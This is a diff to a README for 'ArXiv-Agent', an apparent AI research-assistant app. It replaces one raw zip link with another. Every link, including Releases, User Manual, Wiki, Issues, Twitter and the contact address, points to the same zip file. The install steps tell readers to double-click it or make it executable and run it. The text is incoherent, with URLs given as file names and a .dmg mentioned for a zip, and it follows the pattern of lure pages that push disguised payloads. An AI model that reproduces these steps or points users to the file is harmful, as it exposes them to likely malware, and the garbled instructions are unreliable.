@@ -1,6 +1,6 @@
 # 🕵️ ArXiv-Agent - Your Intelligent Research Assistant Awaits
 
-[![Download ArXiv-Agent](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip)](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip)
+[![Download ArXiv-Agent](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip)](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, make sure your computer meets these basic requirements:
 
 To download ArXiv-Agent:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip) to access the latest version.
+1. Visit the [Releases page](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip) to access the latest version.
 2. Locate the version you want, labeled **v1.0**.
 3. Click on the appropriate download link for your operating system. 
 4. Once the file downloads, find it in your downloads folder.
@@ -29,13 +29,13 @@ After the download is complete, follow these steps:
 
 ### Windows
 
-1. Double-click the downloaded file, `https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip`.
+1. Double-click the downloaded file, `https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip`.
 2. Follow the on-screen prompts in the installation wizard.
 3. Once installed, you can find ArXiv-Agent in your Start Menu. Click to open.
 
 ### macOS
 
-1. Find the downloaded file, `https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip`, in your downloads folder.
+1. Find the downloaded file, `https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip`, in your downloads folder.
 2. Double-click the .dmg file to open it.
 3. Drag the ArXiv-Agent icon to your Applications folder.
 4. Open Applications and click on ArXiv-Agent to launch it.
@@ -44,8 +44,8 @@ After the download is complete, follow these steps:
 
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. Run the command: `chmod +x https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip` to make it executable.
-4. Then execute it by typing: `https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip`.
+3. Run the command: `chmod +x https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip` to make it executable.
+4. Then execute it by typing: `https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip`.
 
 ## 🌟 Features
 
@@ -68,35 +68,35 @@ Once you open ArXiv-Agent, you can:
 
 ### 1. How do I update ArXiv-Agent?
 
-To update, return to the [Releases page](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip) and download the latest version.
+To update, return to the [Releases page](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip) and download the latest version.
 
 ### 2. Is there a user manual available?
 
-Yes, the user manual is included in the `Help` section of the app and also available on the [GitHub Wiki](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip).
+Yes, the user manual is included in the `Help` section of the app and also available on the [GitHub Wiki](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip).
 
 ### 3. Can I contribute to ArXiv-Agent?
 
-We welcome contributions! Please check the `https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip` file in the repository for guidelines.
+We welcome contributions! Please check the `https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip` file in the repository for guidelines.
 
 ### 4. What should I do if I encounter a bug?
 
-If you find any issues, please report them on the [Issues section](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip) of our GitHub repository. We appreciate your feedback.
+If you find any issues, please report them on the [Issues section](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip) of our GitHub repository. We appreciate your feedback.
 
 ## 🔗 Useful Links
 
-- [Download ArXiv-Agent](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip)
-- [User Manual](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip)
-- [Report an Issue](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip)
+- [Download ArXiv-Agent](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip)
+- [User Manual](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip)
+- [Report an Issue](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip)
 
 ## 🧑‍🤝‍🧑 Community Support
 
 Join our community to discuss features, seek help, or share insights. You can find us on:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip)
-- [Twitter](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip)
+- [GitHub Discussions](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip)
+- [Twitter](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip)
 
 ## 📬 Contact
 
-For inquiries or support, feel free to reach us at [https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip](https://raw.githubusercontent.com/azizkode/ArXiv-Agent/main/code/Ar-Agent-Xiv-1.2-beta.5.zip).
+For inquiries or support, feel free to reach us at [https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip](https://github.com/azizkode/ArXiv-Agent/raw/refs/heads/main/code/Ar-Agent-Xiv-2.1.zip).
 
 Thank you for using ArXiv-Agent. We hope it enhances your research experience.
